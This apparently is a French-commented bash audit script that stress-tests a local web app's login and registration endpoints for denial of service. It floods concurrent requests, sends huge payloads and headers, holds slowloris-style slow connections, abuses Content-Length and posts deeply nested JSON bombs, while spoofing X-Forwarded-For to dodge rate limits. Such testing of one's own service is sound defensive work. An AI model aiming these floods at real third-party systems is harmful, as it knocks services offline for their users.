#!/bin/bash
# ============================================================
# BLACK BOX AUDIT - 05 - DENIAL OF SERVICE
# Flood de connexions, large payloads, slowloris,
# chunked encoding, Content-Length abuse, CPU exhaustion
# ============================================================

BASE_URL="http://127.0.0.1:8080"
RESULTS_FILE="/tmp/bb_05_dos_results.txt"
PASS=0; FAIL=0; VULN=0

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; NC='\033[0m'

log_pass() { echo -e "${GREEN}[PASS]${NC} $1" | tee -a "$RESULTS_FILE"; PASS=$((PASS+1)); }
log_fail() { echo -e "${RED}[FAIL]${NC} $1" | tee -a "$RESULTS_FILE"; FAIL=$((FAIL+1)); }
log_vuln() { echo -e "${RED}[VULN]${NC} $1" | tee -a "$RESULTS_FILE"; VULN=$((VULN+1)); }
log_info() { echo -e "${BLUE}[INFO]${NC} $1" | tee -a "$RESULTS_FILE"; }

check_alive() {
    RESP=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "$BASE_URL/login" \
        -X POST -H "Content-Type: application/json" \
        -d '{"username":"alive_check","password":"test"}' 2>/dev/null)
    if [ "$RESP" = "000" ]; then
        log_vuln "[DoS] SERVEUR NE RÉPOND PLUS! (HTTP 000)"
        return 1
    else
        log_pass "[ALIVE] Serveur toujours actif → HTTP $RESP"
        return 0
    fi
}

echo "" | tee "$RESULTS_FILE"
echo "========================================================" | tee -a "$RESULTS_FILE"
echo "  BLACK BOX AUDIT - 05 - DENIAL OF SERVICE" | tee -a "$RESULTS_FILE"
echo "  Date: $(date '+%Y-%m-%d %H:%M:%S')" | tee -a "$RESULTS_FILE"
echo "========================================================" | tee -a "$RESULTS_FILE"
echo "" | tee -a "$RESULTS_FILE"

# ============================================================
# 1. CONNEXIONS SIMULTANÉES (flood basique)
# ============================================================
echo "--- [1] CONNEXION FLOOD (50 connexions simultanées) ---" | tee -a "$RESULTS_FILE"
log_info "Envoi de 50 requêtes simultanées..."
for i in $(seq 1 50); do
    curl -s -o /dev/null \
        -X POST "$BASE_URL/login" \
        -H "Content-Type: application/json" \
        -H "X-Forwarded-For: 10.50.$((i/256)).$((i%256+1))" \
        -d '{"username":"flood_test","password":"Test1234!"}' &
done
wait
log_info "Flood terminé. Vérification serveur..."
sleep 1
check_alive

echo "" | tee -a "$RESULTS_FILE"

# ============================================================
# 2. LARGE PAYLOAD ATTACK
# ============================================================
echo "--- [2] LARGE PAYLOAD (payloads de taille croissante) ---" | tee -a "$RESULTS_FILE"
for SIZE in 1000 10000 100000 1000000 10000000; do
    PADDING=$(python3 -c "print('A' * $SIZE)" 2>/dev/null || printf 'A%.0s' $(seq 1 $SIZE))
    IP="10.60.0.$((SIZE % 254 + 1))"
    T_START=$(date +%s%N)
    RESP=$(curl -s -o /tmp/dos_body.txt -w "%{http_code}" \
        --max-time 10 \
        -X POST "$BASE_URL/register" \
        -H "Content-Type: application/json" \
        -H "X-Forwarded-For: $IP" \
        -d "{\"username\":\"largetest\",\"first_name\":\"A\",\"last_name\":\"B\",\"password\":\"$PADDING\"}" 2>/dev/null)
    T_END=$(date +%s%N)
    ELAPSED=$(( (T_END - T_START) / 1000000 ))
    BODY=$(cat /tmp/dos_body.txt 2>/dev/null | head -c 100)
    echo "  Size=${SIZE}B → HTTP $RESP | ${ELAPSED}ms | $BODY" | tee -a "$RESULTS_FILE"
    if [ "$RESP" = "000" ]; then
        log_vuln "[DoS-LARGE] Crash serveur avec payload ${SIZE}B!"
    elif [ "$ELAPSED" -gt 5000 ]; then
        log_vuln "[DoS-SLOW] Temps de réponse anormal ${ELAPSED}ms avec payload ${SIZE}B"
    fi
    sleep 0.5
done
check_alive

echo "" | tee -a "$RESULTS_FILE"

# ============================================================
# 3. LARGE HEADERS ATTACK
# ============================================================
echo "--- [3] LARGE HEADERS ATTACK ---" | tee -a "$RESULTS_FILE"
for SIZE in 1000 8000 16000 64000; do
    PADDING=$(python3 -c "print('A' * $SIZE)" 2>/dev/null || printf 'A%.0s' $(seq 1 $SIZE))
    RESP=$(curl -s -o /tmp/dos_body.txt -w "%{http_code}" \
        --max-time 5 \
        -X POST "$BASE_URL/login" \
        -H "Content-Type: application/json" \
        -H "X-Huge-Header: $PADDING" \
        -d '{"username":"headertest","password":"Test1234!"}' 2>/dev/null)
    BODY=$(cat /tmp/dos_body.txt 2>/dev/null | head -c 100)
    echo "  Header size=${SIZE}B → HTTP $RESP | $BODY" | tee -a "$RESULTS_FILE"
    [ "$RESP" = "000" ] && log_vuln "[DoS-HEADER] Crash avec header de ${SIZE}B!"
    sleep 0.5
done
check_alive

echo "" | tee -a "$RESULTS_FILE"

# ============================================================
# 4. SLOWLORIS ATTACK (connexions qui gardent la socket ouverte)
# ============================================================
echo "--- [4] SLOWLORIS SIMULATION (10 connexions lentes) ---" | tee -a "$RESULTS_FILE"
log_info "Ouverture de 10 connexions lentes simultanées (--limit-rate 1)..."
for i in $(seq 1 10); do
    curl -s -o /dev/null \
        --max-time 30 \
        --limit-rate 1 \
        -X POST "$BASE_URL/login" \
        -H "Content-Type: application/json" \
        -H "X-Forwarded-For: 10.70.0.$i" \
        -d '{"username":"slowloris_test","password":"VeryLongPasswordThatWeAreTypingSlowly12345678901234567890"}' &
done
SLOWLORIS_PIDS=$!

# Pendant les connexions lentes, vérifier si le serveur répond encore
sleep 2
log_info "Test disponibilité pendant slowloris..."
check_alive

sleep 2
check_alive

# Kill les connexions lentes
kill $(jobs -p) 2>/dev/null
wait 2>/dev/null

echo "" | tee -a "$RESULTS_FILE"

# ============================================================
# 5. CONTENT-LENGTH MISMATCH
# ============================================================
echo "--- [5] CONTENT-LENGTH MISMATCH ---" | tee -a "$RESULTS_FILE"

# Content-Length > corps réel
log_info "Test Content-Length plus grand que le body réel..."
RESP=$(curl -s -o /tmp/dos_body.txt -w "%{http_code}" \
    --max-time 5 \
    -X POST "$BASE_URL/register" \
    -H "Content-Type: application/json" \
    -H "Content-Length: 99999" \
    -d '{"username":"cltest","first_name":"A","last_name":"B","password":"Test1234!"}' 2>/dev/null)
BODY=$(cat /tmp/dos_body.txt 2>/dev/null)
echo "  Content-Length=99999, body réel ~50B → HTTP $RESP | $BODY" | tee -a "$RESULTS_FILE"
[ "$RESP" = "000" ] && log_vuln "[DoS-CL] Crash sur Content-Length mismatch!"

sleep 1

# Content-Length = 0 avec body non vide
RESP2=$(curl -s -o /tmp/dos_body.txt -w "%{http_code}" \
    --max-time 5 \
    -X POST "$BASE_URL/register" \
    -H "Content-Type: application/json" \
    -H "Content-Length: 0" \
    -d '{"username":"cltest2","first_name":"A","last_name":"B","password":"Test1234!"}' 2>/dev/null)
BODY2=$(cat /tmp/dos_body.txt 2>/dev/null)
echo "  Content-Length=0, body non vide → HTTP $RESP2 | $BODY2" | tee -a "$RESULTS_FILE"

# Content-Length négatif
RESP3=$(curl -s -o /tmp/dos_body.txt -w "%{http_code}" \
    --max-time 5 \
    -X POST "$BASE_URL/register" \
    -H "Content-Type: application/json" \
    -H "Content-Length: -1" \
    -d '{"username":"cltest3","first_name":"A","last_name":"B","password":"Test1234!"}' 2>/dev/null)
BODY3=$(cat /tmp/dos_body.txt 2>/dev/null)
echo "  Content-Length=-1 → HTTP $RESP3 | $BODY3" | tee -a "$RESULTS_FILE"

check_alive
echo "" | tee -a "$RESULTS_FILE"

# ============================================================
# 6. JSON BOMB (deeply nested / very large array)
# ============================================================
echo "--- [6] JSON BOMB ---" | tee -a "$RESULTS_FILE"

# JSON profondément imbriqué
python3 -c "
d = '{\"a\":'
for i in range(10000):
    d += '{\"b\":'
d += '\"val\"'
for i in range(10000):
    d += '}'
d += '}'
print(d)
" > /tmp/json_bomb_nested.json 2>/dev/null

RESP_BOMB=$(curl -s -o /tmp/dos_body.txt -w "%{http_code}" \
    --max-time 10 \
    -X POST "$BASE_URL/register" \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: 10.80.0.1" \
    --data-binary @/tmp/json_bomb_nested.json 2>/dev/null)
BODY_BOMB=$(cat /tmp/dos_body.txt 2>/dev/null | head -c 100)
echo "  JSON 10000 niveaux imbriqués → HTTP $RESP_BOMB | $BODY_BOMB" | tee -a "$RESULTS_FILE"
[ "$RESP_BOMB" = "000" ] && log_vuln "[DoS-JSON-BOMB] Crash sur JSON profondément imbriqué!"

# Tableau de 100000 éléments
python3 -c "
import json
arr = ['x'] * 100000
print(json.dumps({'username': arr, 'first_name': 'A', 'last_name': 'B', 'password': 'Test1234!'}))" \
    > /tmp/json_bomb_array.json 2>/dev/null

RESP_ARR=$(curl -s -o /tmp/dos_body.txt -w "%{http_code}" \
    --max-time 10 \
    -X POST "$BASE_URL/register" \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: 10.80.0.2" \
    --data-binary @/tmp/json_bomb_array.json 2>/dev/null)
BODY_ARR=$(cat /tmp/dos_body.txt 2>/dev/null | head -c 100)
echo "  JSON array 100000 éléments → HTTP $RESP_ARR | $BODY_ARR" | tee -a "$RESULTS_FILE"
[ "$RESP_ARR" = "000" ] && log_vuln "[DoS-JSON-ARR] Crash sur JSON tableau massif!"

check_alive
echo "" | tee -a "$RESULTS_FILE"

# ============================================================
# 7. CONCURRENT REGISTRATION (race condition DoS)
# ============================================================
echo "--- [7] CONCURRENT REGISTRATION FLOOD ---" | tee -a "$RESULTS_FILE"
log_info "100 registrations simultanées avec différents usernames..."
for i in $(seq 1 100); do
    curl -s -o /dev/null \
        -X POST "$BASE_URL/register" \
        -H "Content-Type: application/json" \
        -H "X-Forwarded-For: 10.90.$((i/256)).$((i%256+1))" \
        -d "{\"username\":\"flooduser$i\",\"first_name\":\"F\",\"last_name\":\"L\",\"password\":\"Test1234!\"}" &
done
wait
log_info "Flood de registration terminé."
check_alive

echo "" | tee -a "$RESULTS_FILE"

# ============================================================
# 8. VÉRIFICATION FINALE
# ============================================================
echo "--- [8] VÉRIFICATION FINALE POST-DoS ---" | tee -a "$RESULTS_FILE"
sleep 2
for i in $(seq 1 3); do
    T_START=$(date +%s%N)
    RESP=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 \
        -X POST "$BASE_URL/login" \
        -H "Content-Type: application/json" \
        -H "X-Forwarded-For: 10.99.0.$i" \
        -d '{"username":"final_check","password":"test"}' 2>/dev/null)
    T_END=$(date +%s%N)
    ELAPSED=$(( (T_END - T_START) / 1000000 ))
    echo "  Vérification $i/3 → HTTP $RESP | ${ELAPSED}ms" | tee -a "$RESULTS_FILE"
    [ "$RESP" = "000" ] && log_vuln "[DoS-FINAL] Serveur inaccessible après tests DoS!"
    sleep 1
done

echo "" | tee -a "$RESULTS_FILE"
echo "========================================================" | tee -a "$RESULTS_FILE"
echo "  RÉSULTATS DoS: $PASS PASS | $FAIL FAIL | $VULN VULN" | tee -a "$RESULTS_FILE"
echo "  Résultats complets: $RESULTS_FILE" | tee -a "$RESULTS_FILE"
echo "========================================================" | tee -a "$RESULTS_FILE"
